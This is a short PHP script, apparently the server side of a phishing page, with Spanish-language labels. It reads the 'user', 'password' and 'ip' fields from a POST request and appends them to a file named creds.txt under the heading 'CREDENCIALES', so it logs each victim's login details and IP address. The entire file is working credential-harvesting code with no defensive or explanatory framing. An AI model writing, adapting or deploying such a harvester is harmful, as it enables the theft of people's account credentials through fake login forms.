<?php

$user = $_POST['user'];
$password = $_POST['password'];
$ip = $_POST['ip'];


$archivo= "creds.txt";
$proceso=fopen($archivo, "a") or die("Error");


fwrite($proceso,"CREDENCIALES: ");
fwrite($proceso,$user);
fwrite($proceso," // ");
fwrite($proceso,$password);
fwrite($proceso,"\n");
fwrite($proceso,"IP: ");
fwrite($proceso,$ip);
fwrite($proceso,"\n");
fwrite($proceso,"#####################");
fwrite($proceso,"\n");
fwrite($proceso,"\n");

fclose($proceso);
